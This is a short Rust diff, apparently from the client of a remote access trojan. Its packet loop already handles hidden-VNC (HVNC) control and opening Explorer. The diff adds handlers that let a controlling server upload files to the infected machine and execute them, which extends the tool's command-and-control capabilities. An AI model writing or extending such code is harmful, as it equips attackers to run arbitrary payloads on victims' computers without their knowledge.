@@ -127,6 +127,12 @@ pub async fn reading_loop(
             Ok(Some(ClientboundPacket::StopHVNC)) => stop_hvnc(),
             
             Ok(Some(ClientboundPacket::OpenExplorer)) => open_process("explorer.exe"),
+            
+            Ok(Some(ClientboundPacket::UploadAndExecute(file_data))) => file_manager.upload_and_execute(file_data).await,
+            
+            Ok(Some(ClientboundPacket::ExecuteFile(path))) => file_manager.execute_file(&path).await,
+            
+            Ok(Some(ClientboundPacket::UploadFile(target_folder, file_data))) => file_manager.upload_file(target_folder, file_data).await,
 
             Ok(Some(p)) => {
                 println!("!!Unhandled packet: {:?}", p);
